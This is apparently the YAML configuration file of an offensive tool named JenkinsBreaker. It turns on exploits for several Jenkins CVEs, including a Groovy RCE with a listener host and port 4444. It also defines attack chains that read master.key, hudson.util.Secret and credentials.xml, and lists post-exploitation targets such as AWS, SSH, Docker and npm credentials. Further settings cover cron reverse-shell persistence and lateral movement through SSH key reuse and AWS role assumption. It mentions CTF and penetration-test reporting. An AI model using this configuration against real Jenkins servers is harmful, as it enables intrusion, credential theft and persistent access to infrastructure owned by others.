# JenkinsBreaker Exploit Configuration
# Customize exploit parameters and chains

# Individual exploit configurations
exploits:
  CVE-2024-23897:
    enabled: true
    description: "CLI Arbitrary File Read"
    priority: high
    timeout: 60
    retry_on_failure: true
    default_options:
      file_path: "/etc/passwd"
    
  CVE-2024-43044:
    enabled: true
    description: "Agent Arbitrary File Read to RCE"
    priority: critical
    timeout: 120
    default_options:
      mode: "full_rce"
      jenkins_home: "/var/jenkins_home"
  
  CVE-2019-1003029:
    enabled: true
    description: "Script Security Groovy RCE"
    priority: critical
    timeout: 90
    default_options:
      lhost: "${LHOST}"
      lport: 4444
  
  FEATURE-SCRIPT-CONSOLE:
    enabled: true
    description: "Authenticated RCE via Script Console"
    priority: high
    timeout: 60
    requires_auth: true
    default_options:
      detection: "dns"  # dns, http, sleep

# Exploit chains (sequential execution)
chains:
  # Quick CTF chain
  ctf_quick:
    description: "Fast CTF exploitation chain"
    exploits:
      - cve: "CVE-2024-23897"
        options:
          file_path: "/var/jenkins_home/secrets/master.key"
        on_success: extract_secrets
      
      - cve: "CVE-2024-23897"
        options:
          file_path: "/var/jenkins_home/secrets/hudson.util.Secret"
        on_success: extract_secrets
      
      - cve: "CVE-2024-23897"
        options:
          file_path: "/var/jenkins_home/credentials.xml"
        on_success: decrypt_credentials
  
  # Full compromise chain
  full_compromise:
    description: "Complete infrastructure compromise"
    exploits:
      - cve: "CVE-2024-23897"
        options:
          file_path: "/etc/passwd"
        on_success: enumerate_users
      
      - cve: "CVE-2024-43044"
        options:
          mode: "full_rce"
          command: "whoami"
        on_success: verify_rce
      
      - cve: "FEATURE-SCRIPT-CONSOLE"
        options:
          command: "System.getenv()"
        on_success: extract_environment
        requires:
          - admin_access
    
    post_exploitation:
      - upload_linpeas
      - extract_credentials
      - establish_persistence
  
  # Stealth enumeration chain
  stealth_enum:
    description: "Low-impact enumeration"
    exploits:
      - cve: "CVE-2024-23897"
        options:
          file_path: "/var/jenkins_home/config.xml"
        on_success: parse_config
      
      - enumerate: plugins
      - enumerate: jobs
      - enumerate: users

# Post-exploitation actions
post_exploitation:
  # Credential extraction targets
  credentials:
    - path: "/var/jenkins_home/secrets/master.key"
      type: "jenkins_master_key"
    - path: "/var/jenkins_home/secrets/hudson.util.Secret"
      type: "jenkins_secret"
    - path: "/var/jenkins_home/credentials.xml"
      type: "jenkins_credentials"
    - path: "/home/jenkins/.aws/credentials"
      type: "aws_credentials"
    - path: "/home/jenkins/.ssh/id_rsa"
      type: "ssh_private_key"
    - path: "/home/jenkins/.docker/config.json"
      type: "docker_auth"
    - path: "/home/jenkins/.npmrc"
      type: "npm_token"
  
  # Persistence mechanisms
  persistence:
    - type: "cron"
      enabled: false
      payload: "reverse_shell"
    - type: "jenkins_pipeline"
      enabled: false
      job_name: "maintenance"
  
  # Lateral movement
  lateral_movement:
    - type: "ssh_key_reuse"
      enabled: true
    - type: "aws_sts_assume"
      enabled: true
    - type: "docker_registry"
      enabled: true

# Reporting configuration
reporting:
  formats:
    - json
    - markdown
    - html
  
  include:
    - exploit_timeline
    - credentials_found
    - persistence_established
    - lateral_movement_paths
    - mitre_attack_mapping
  
  severity_threshold: "medium"  # Only report medium+ findings
